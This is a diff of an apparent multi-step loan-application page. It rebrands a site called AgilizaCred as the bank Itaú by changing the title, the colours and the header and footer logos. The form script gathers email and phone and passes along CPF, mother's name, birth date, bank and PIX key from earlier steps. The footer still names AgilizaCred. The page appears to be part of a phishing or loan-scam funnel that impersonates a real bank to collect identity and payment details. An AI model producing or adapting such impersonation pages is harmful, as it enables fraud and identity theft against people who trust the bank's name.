@@ -1,19 +1,24 @@
 <!DOCTYPE html><html lang="pt-BR"><head>
   <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
-    <script>
-  window.pixelId = "69853718bc934f7cb27cf6c5";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  document.head.appendChild(a);
-</script>
+   
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Confirme seus Dados — AgilizaCred</title>
+  <title>Confirme seus Dados — Itaú</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Outfit:wght@400;500;600;700;800&family=Plus+Jakarta+Sans:wght@500;600;700;800&family=Sora:wght@700;800&display=swap');
-    :root{--green:#22C55E;--green-dark:#16A34A;--green-light:#DCFCE7;--bg:#F4F5F7;--card:#FFFFFF;--text:#111827;--text-mid:#374151;--text-light:#6B7280;--border:#E5E7EB;--danger:#ef4444;--radius:18px;--shadow:0 4px 24px rgba(0,0,0,.06),0 1px 2px rgba(0,0,0,.04);}
+    :root{
+      --green: #ff6200;
+      --green-dark: #ff6200;
+      --green-light: #fff8f3;
+      --bg:#F4F5F7;
+      --card:#FFFFFF;
+      --text:#111827;
+      --text-mid:#374151;
+      --text-light:#6B7280;
+      --border:#E5E7EB;
+      --danger:#ef4444;
+      --radius:18px;
+      --shadow:0 4px 24px rgba(0,0,0,.06),0 1px 2px rgba(0,0,0,.04);}
     *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent;}
     body{background:var(--bg);color:var(--text);-webkit-font-smoothing:antialiased;min-height:100vh;display:flex;flex-direction:column;padding-top:72px;font-family:'DM Sans',sans-serif;}
 
@@ -23,8 +28,30 @@
     .menu-icon{width:40px;height:40px;background:#F3F4F6;border-radius:12px;display:flex;align-items:center;justify-content:center;cursor:pointer;border:1px solid var(--border);transition:all 0.2s ease;}
     .menu-icon:hover{background:var(--border);transform:scale(1.05);}
     .menu-icon svg{width:18px;height:18px;color:var(--text-mid);stroke-width:2.5;}
+
+    /* ✅ NOVO: logo em imagem (header/rodapé) */
+    .brand-logo{
+      display:flex;
+      align-items:center;
+      user-select:none;
+      text-decoration:none;
+      line-height:0;
+    }
+    .brand-logo img{
+      display:block;
+      height: 26px; /* ajuste se quiser */
+      width:auto;
+      max-width: 190px;
+      object-fit: contain;
+    }
+    .footer-logo-img img{
+      height: 20px; /* ajuste se quiser */
+      max-width: 180px;
+      opacity: 0.95;
+    }
+
     .logo{display:flex;align-items:center;user-select:none;}
-        .logo-cred{ font-family:'Sora','Plus Jakarta Sans',sans-serif; font-weight:800; font-size:20px; color:#111827; letter-spacing:-0.5px; line-height:1; }
+    .logo-cred{ font-family:'Sora','Plus Jakarta Sans',sans-serif; font-weight:800; font-size:20px; color:#111827; letter-spacing:-0.5px; line-height:1; }
     .logo-diamond{ width:7px; height:7px; background:#22C55E; transform:rotate(45deg); margin:0 8px; border-radius:1.5px; flex-shrink:0; }
     .logo-on{ font-family:'Sora','Plus Jakarta Sans',sans-serif; font-weight:800; font-size:20px; color:#22C55E; letter-spacing:-0.5px; line-height:1; }
     .header-right{display:flex;align-items:center;gap:10px;}
@@ -86,14 +113,14 @@
     footer.site-footer{margin-top:auto;background:#FFFFFF;color:var(--text-light);padding:24px 20px;display:flex;align-items:center;justify-content:center;text-align:center;border-top:1px solid var(--border);}
     .footer-inner{max-width:550px;width:100%;display:flex;flex-direction:column;align-items:center;gap:10px;}
     .footer-logo{display:flex;align-items:center;user-select:none;}
-        .footer-logo .logo-cred{ font-size:15px; color:#6B7280; }
+    .footer-logo .logo-cred{ font-size:15px; color:#6B7280; }
     .footer-logo .logo-diamond{ width:5px; height:5px; margin:0 6px; background:#6B7280; }
     .footer-logo .logo-on{ font-size:15px; color:#22C55E; }
     footer small{font-size:11px;opacity:0.75;line-height:1.5;}
     footer small strong{color:var(--green-dark);font-weight:600;}
 
     @media(max-width:600px){.container{padding:24px 20px;}.page-title{font-size:1.3rem;}.form-input{padding:13px 14px 13px 44px;font-size:0.95rem;}.btn-submit{padding:15px 20px;font-size:0.95rem;}.info-card{padding:14px;gap:12px;}.info-icon-box{width:40px;height:40px;min-width:40px;}.info-icon-box svg{width:22px;height:22px;}.info-list li{font-size:0.78rem;}}
-      .logo-wrap { display:flex; flex-direction:column; align-items:center; user-select:none; text-decoration:none; }
+    .logo-wrap { display:flex; flex-direction:column; align-items:center; user-select:none; text-decoration:none; }
     .logo-row { display:flex; align-items:center; }
     .logo-tagline { font-family:'DM Sans','Poppins',sans-serif; font-weight:600; font-size:7px; letter-spacing:2.5px; text-transform:uppercase; color:#6B7280; margin-top:1px; }
     .footer-tagline { font-family:'DM Sans','Poppins',sans-serif; font-weight:600; font-size:6px; letter-spacing:2px; text-transform:uppercase; color:#9CA3AF; margin-top:1px; }
@@ -104,7 +131,19 @@
     <div class="header-content">
       <div class="header-left">
         <div class="menu-icon"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path></svg></div>
-        <div class="logo-wrap"><div class="logo-row"><span class="logo-cred">Agiliza</span><span class="logo-on">Cred</span></div><span class="logo-tagline">Crédito Fácil</span></div>
+
+        <!-- ✅ LOGO EM IMAGEM (adicione seu arquivo em /images/logo.png) -->
+        <a class="brand-logo" href="#" aria-label="Itaú">
+          <img src="/images/itau2.png" alt="Itaú">
+        </a>
+
+        <!-- (se quiser manter a logo antiga também, descomente) -->
+        <!--
+        <div class="logo-wrap">
+          <div class="logo-row"><span class="logo-cred">Agiliza</span><span class="logo-on">Cred</span></div>
+          <span class="logo-tagline">Crédito Fácil</span>
+        </div>
+        -->
       </div>
       <div class="header-right">
         <div class="user-info">
@@ -160,7 +199,12 @@
 
   <footer class="site-footer">
     <div class="footer-inner">
-      <div class="footer-logo"><span class="logo-cred">Agiliza</span><span class="logo-on">Cred</span></div>
+
+      <!-- ✅ LOGO EM IMAGEM (adicione seu arquivo em /images/logo.png) -->
+      <a class="brand-logo footer-logo-img" href="#" aria-label="Itaú">
+        <img src="/images/itau2.png" alt="Itaú">
+      </a>
+
       <small><strong>AgilizaCred Soluções Financeiras Ltda.</strong><br>CNPJ: 36.947.229/0001-85 – São Paulo, SP – 01310-200</small>
     </div>
   </footer>
@@ -178,6 +222,5 @@
     function validatePhone(phone){const cl=phone.replace(/\D/g,'');const err=document.getElementById('phoneError');const inp=document.getElementById('phoneInput');if(cl.length<10){inp.classList.add('error');inp.classList.remove('success');err.classList.add('show');return false;}else{inp.classList.remove('error');inp.classList.add('success');err.classList.remove('show');return true;}}
     function handleSubmit(event){event.preventDefault();const email=document.getElementById('emailInput').value.trim();const phone=document.getElementById('phoneInput').value;const phoneClean=phone.replace(/\D/g,'');const emailValid=validateEmail(email);const phoneValid=validatePhone(phone);if(!emailValid||!phoneValid)return false;document.getElementById('loadingOverlay').classList.add('show');localStorage.setItem('email',email);localStorage.setItem('telephone',phoneClean);localStorage.setItem('telefone',phoneClean);const urlParams=new URLSearchParams(window.location.search);urlParams.set('email',email);urlParams.set('telephone',phoneClean);const importantParams=['income','salaryDay','occupation','education','utm_source','utm_campaign','utm_medium','utm_content','utm_term','name','document','nome_mae','data_nasc','dueDate','cpf','nome','banco','chave_pix','selectedLoanAmount','selectedInstallments','selectedMonthlyPayment'];importantParams.forEach(param=>{const value=localStorage.getItem(param);if(value&&!urlParams.has(param))urlParams.set(param,value);});setTimeout(()=>{window.location.href='9.html';},1500);return false;}
   </script>
-
 
 </body></html>
